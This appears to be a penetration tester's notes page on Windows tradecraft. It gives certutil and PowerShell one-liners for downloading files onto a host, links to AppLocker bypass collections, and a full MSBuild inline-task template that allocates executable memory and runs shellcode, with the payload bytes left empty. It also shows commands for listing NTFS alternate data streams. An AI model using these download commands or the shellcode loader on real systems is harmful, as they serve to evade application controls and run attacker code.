# Windows

## Windows Registry

## File Transfers

### powershell

```text
(New-Object System.Net.WebClient).DownloadFile("https://example.com/archive.zip", "C:\Windows\Temp\archive.zip")  
```

### certutil

```bash
certutil.exe -urlcache -split -f https://myserver/filename outputfilename
```

## Applocker

> AppLocker advances the app control features and functionality of Software Restriction Policies. AppLocker contains new capabilities and extensions that allow you to create rules to allow or deny apps from running based on unique identities of files and to specify which users or groups can run those apps.

Source: [What Is AppLocker?](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker)

Despite the power this gives the Administrator in locking down what users can and can't execute, there are a disturbing number of ways to bypass this.  [Ultimate Applocker Bypass List](https://github.com/api0cradle/UltimateAppLockerByPassList) aims to record most of them.

[GreatSCT ](https://github.com/GreatSCT/GreatSCT)can also be used to generate payloads to bypass these.

### MSBuild

We can use MSBuild to execute arbitrary shellcode. The Cn33liz [MSBuildShell ](https://github.com/Cn33liz/MSBuildShell)is one such example. To compile a `csproj` file we use:

```text
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe test.csproj
```

An example csproj file to include shellcode within is:

```markup
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <!-- This inline task executes shellcode. -->
  <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj -->
  <!-- Save This File And Execute The Above Command -->
  <!-- Author: Casey Smith, Twitter: @subTee --> 
  <!-- License: BSD 3-Clause -->
  <Target Name="Hello">
    <ClassExample />
  </Target>
  <UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
    <Task>
    
      <Code Type="Class" Language="cs">
      <![CDATA[
        using System;
        using System.Runtime.InteropServices;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;
        public class ClassExample :  Task, ITask
        {         
          private static UInt32 MEM_COMMIT = 0x1000;          
          private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;          
          [DllImport("kernel32")]
            private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
            UInt32 size, UInt32 flAllocationType, UInt32 flProtect);          
          [DllImport("kernel32")]
            private static extern IntPtr CreateThread(            
            UInt32 lpThreadAttributes,
            UInt32 dwStackSize,
            UInt32 lpStartAddress,
            IntPtr param,
            UInt32 dwCreationFlags,
            ref UInt32 lpThreadId           
            );
          [DllImport("kernel32")]
            private static extern UInt32 WaitForSingleObject(           
            IntPtr hHandle,
            UInt32 dwMilliseconds
            );          
          public override bool Execute()
          {
	  	byte[] shellcode = new byte[351] {};
	  	UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
                MEM_COMMIT, PAGE_EXECUTE_READWRITE);
              Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
              IntPtr hThread = IntPtr.Zero;
              UInt32 threadId = 0;
              IntPtr pinfo = IntPtr.Zero;
              hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
              WaitForSingleObject(hThread, 0xFFFFFFFF);
              return true;
          } 
        }     
      ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

## Alternate Data Streams

This is more a  feature of the NTFS file system than it is a Windows feature, but it's important to understand from both a red-team and blue-team perspective.  

These are also disturbingly common in CTF's through the security via obscurity, so we need some method of viewing and potentially executing these alternate data streams.  To list all alternate data streams 

```text
dir /R
```

### Powershell

```bash
Get-Content -path C:\Users\Booj\ads -stream *
```

We can also view individual streams using

```text
Get-Content -path C:\Users\Booj\ads -stream <streamname>
```

### Windows Pre-Vista

In Windows prior to Vista, there's unfortunately no easy way of viewing these streams in default Windows without a GUI access.  In an engagement this may not be entirely practical.

The best version, working on XP, I found to be [LADS](https://www.aldeid.com/wiki/LADS), but a number of the links online appear to be dead.  The [Web Archive](http://web.archive.org/web/20150602054446/http://www.heysoft.de/download/lads.zip) version is still up so acquiring a copy is still possible.

## References

[Abatchy - Powershell Download File One-Liners](https://www.abatchy.com/2017/03/powershell-download-file-one-liners)  
[Sploitspren - Windows Privilege Escalation Guide](https://www.sploitspren.com/2018-01-26-Windows-Privilege-Escalation-Guide/)

